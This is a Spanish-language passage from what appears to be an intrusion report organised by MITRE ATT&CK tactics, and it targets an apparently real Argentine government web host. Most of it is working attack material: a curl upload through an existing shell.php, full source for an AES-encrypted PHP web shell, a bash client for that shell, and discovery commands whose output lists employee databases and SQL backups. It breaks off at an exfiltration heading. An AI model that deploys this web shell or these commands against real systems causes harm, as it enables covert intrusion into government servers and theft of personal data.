       curl -k -X POST -F "file=@aes_key.bin" "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=cat > /tmp/.cache/aes_key.bin && chmod 600 /tmp/.cache/aes_key.bin"
       ```

    Implementación del Web Shell Cifrado (secure_shell.php)
       ```text
             <?php
                // secure_shell.php - Web shell con cifrado AES-256-CBC
                $SECRET_KEY = file_get_contents('/tmp/.cache/aes_key.bin');
                $IV = substr(hash('sha256', $SECRET_KEY), 0, 16); // IV derivado de clave
                
                if(isset($_REQUEST['enc_cmd'])) {
                    try {
                        //Validar y decodificar input
                        $comando_cifrado = base64_decode(trim($_REQUEST['enc_cmd']));
                        if(empty($comando_cifrado) || strlen($comando_cifrado) > 4096) {
                            throw new Exception("Input inválido");
                        }
                        
                        //Descifrar comando
                        $comando_descifrado = openssl_decrypt(
                            $comando_cifrado, 
                            'aes-256-cbc', 
                            $SECRET_KEY, 
                            OPENSSL_RAW_DATA, 
                            $IV
                        );
                        
                        if(!$comando_descifrado) {
                            throw new Exception("Error en descifrado");
                        }
                        
                        // Validar comando (lista blanca)
                        $comandos_permitidos = [
                            'whoami', 'id', 'pwd', 'uname -a',
                            'cat /etc/os-release', 'ls -la', 
                            'ps aux', 'netstat -tulpn',
                            'find / -type f -name "*.conf" 2>/dev/null | head -10'
                        ];
                        
                        $comando_limpio = trim($comando_descifrado);
                        if(!in_array($comando_limpio, $comandos_permitidos)) {
                            throw new Exception("Comando no permitido: " . substr($comando_limpio, 0, 20));
                        }
                        
                        // Ejecutar comando seguro
                        $output = shell_exec(escapeshellcmd($comando_limpio) . " 2>&1");
                        
                        // Cifrar respuesta
                        $respuesta_cifrada = openssl_encrypt(
                            $output, 
                            'aes-256-cbc', 
                            $SECRET_KEY, 
                            OPENSSL_RAW_DATA, 
                            $IV
                        );
                        
                        echo base64_encode($respuesta_cifrada);
                        
                    } catch (Exception $e) {
                        // Manejo seguro de errores
                        $error_cifrado = openssl_encrypt(
                            "ERROR: " . $e->getMessage(), 
                            'aes-256-cbc', 
                            $SECRET_KEY, 
                            OPENSSL_RAW_DATA, 
                            $IV
                        );
                        echo base64_encode($error_cifrado);
                    }
                } else {
                    http_response_code(400);
                    echo "Parámetro enc_cmd requerido";
                }
                ?>
       ```
          - Ejecución de Comandos Cifrados:
             ```text
                        #!/bin/bash
                        # attack_script.sh - Cliente para canal cifrado
                        
                        SECRET_KEY=$(cat aes_key.bin)
                        IV=$(echo -n "$SECRET_KEY" | sha256sum | cut -d' ' -f1 | head -c 16)
                        
                        ejecutar_comando_cifrado() {
                            local comando="$1"
                            
                            # Cifrar comando
                            local comando_cifrado=$(echo -n "$comando" | openssl enc -aes-256-cbc \
                                -K $(echo -n "$SECRET_KEY" | base64 -d | xxd -p -c 256) \
                                -iv "$IV" -base64 -A)
                            
                            # Enviar comando cifrado
                            local respuesta_cifrada=$(curl -s -k \
                                "https://siper.vialidad.gob.ar/tmp/uploads/secure_shell.php?enc_cmd=$comando_cifrado")
                            
                            # Descifrar respuesta
                            echo -n "$respuesta_cifrada" | base64 -d | openssl enc -aes-256-cbc -d \
                                -K $(echo -n "$SECRET_KEY" | base64 -d | xxd -p -c 256) \
                                -iv "$IV" 2>/dev/null
                        }
             ```
                        

           - Ejemplos de uso
              ```text
           
               echo "=== TESTEO CANAL CIFRADO ==="
               echo "Usuario: $(ejecutar_comando_cifrado 'whoami')"
               echo "Directorio: $(ejecutar_comando_cifrado 'pwd')"
               echo "Sistema: $(ejecutar_comando_cifrado 'uname -a')"
               echo "4. Procesos:"
                        ejecutar_comando_cifrado 'ps aux | head -5'
               echo "5. Configuraciones:"
                        ejecutar_comando_cifrado 'find / -type f -name "*.conf" 2>/dev/null | head -3'
                               
              ```
                

## Actions on Objectives
- TA0009 – Collection

    Recopilación de Información mediante Canal Cifrado
    - T1082 – System Information Discovery
      Descubrimiento de estructura mediante canal cifrado:
      ```text

      # Explorar estructura de directorios usando el canal seguro
      ejecutar_comando_cifrado 'find /var/www -name "*.db" -o -name "*.sql" -o -name "*database*" 2>/dev/null'
      ```
      Respuesta:
      ```text
      /var/www/html/siper/database/
      /var/www/html/siper/database/empleados.db
      /var/www/html/siper/config/database.conf
      /var/www/html/siper/backups/backup_20240901.sql
      ```




- TA0010 – Exfiltration


